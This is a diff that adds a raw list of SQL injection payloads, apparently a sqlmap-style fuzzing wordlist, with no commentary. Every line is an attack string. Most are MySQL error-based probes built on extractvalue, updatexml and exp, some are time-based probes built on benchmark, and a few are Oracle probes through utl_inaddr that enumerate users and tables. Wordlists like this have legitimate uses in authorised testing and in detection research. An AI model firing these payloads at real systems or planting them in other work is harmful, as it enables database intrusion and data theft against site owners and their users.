@@ -1,0 +1,200 @@
+1'+  (  select 'vbqo' where 5630  =  5630 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  
+1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd
+1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '
+1" where 3933  =  3933 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --
+1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1"  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --
+1 where 6369  =  6369 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --
+1" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and "ymwb"  =  "ymwb
+1%"   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  "%"  =  "
+1%"   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  "%"  =  "
+1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --
+1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '
+1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  
+1"   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   "nzhj" like "nzhj
+1" where 4445  =  4445 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1',  (  select   (  case when   (  6560  =  2813  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  
+1"   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  "dzse"  =  "dzse
+1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'aqdj'  =  'aqdj
+1%"   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   "%"  =  "
+1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl
+1" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and "okpa"  =  "okpa
+1" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and "ekjs" like "ekjs
+1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130
+1%" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1%" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib
+1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn
+1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'tblb'  =  'tblb
+1' where 2160  =  2160 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1"  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --
+1"  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  "thkh" like "thkh
+1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'
+1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn
+1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd
+1'||  (  select 'fcws' from dual where 9184  =  9184 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'
+1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'
+1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1"  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --
+exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1"   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  "mmsh"  =  "mmsh
+1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv
+1'||  (  select 'kbvq' where 9279  =  9279 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'
+1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep
+1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1"  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  "thkh" like "thkh
+1%"   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  "%"  =  "
+1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1"  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --
+1" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  
+1" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  
+1"   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   "gmld" like "gmld
+1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs
+1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474
+1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --
+1"   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --
+1" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   
+1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185
+1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  -- mwsm
+1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'
+1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni
+1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  
+ AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i
+1"  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --
+1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq
+1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  
+1%"  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  "%"  =  "
+1%"   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474
+1%" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and "%"  =  "
+1" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and "pnub"  =  "pnub
+1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd
+exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1 where 4968  =  4968 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --
+1"  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha
+1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --
+1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --
+1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- nqdb
+1  )   where 2473  =  2473 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --
+1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1"   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --
+1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   
+1"  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1"  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --
+1  )   where 1185  =  1185 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+ AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i
+1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   8965  =  8965
+1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda
+1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  
+1%"   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  "%"  =  "
+1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --
+1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn
+1"  )   where 4182  =  4182 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'cipk'  =  'cipk
+1" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and "ekjs" like "ekjs
+1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi
+1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  
+1 where 7757  =  7757 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --
+1 where 4968  =  4968 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --
+1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  
+1"  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  "stcv"  =  "stcv
+1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1%'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%'  =  '
+1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zenl' like 'zenl
+ (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) 
+1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  # usus
+1  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  
+1"  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  "mhfc"  =  "mhfc
+1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'
+1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi
+1%" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and "%"  =  "
+1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib
+1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'
+1" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #
+1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '
+1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'beju' like 'beju
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'tblb'  =  'tblb
+1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1"   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  "yopd" like "yopd
+1"   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  "yxpo" like "yxpo
+1"  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --
+1"   )    )    as eqeb where 6784  =  6784 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --
+1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130
+1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm
+1"  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --
+1"   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  "tabq" like "tabq
+1"  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  "thkh" like "thkh
+1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'
+1  )   where 1185  =  1185 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq
+1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1%"   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   "%"  =  "
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu
+1"  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  "mhfc"  =  "mhfc
+1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #
+1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda
+exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'usnh' like 'usnh
+1"  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  "smhd" like "smhd
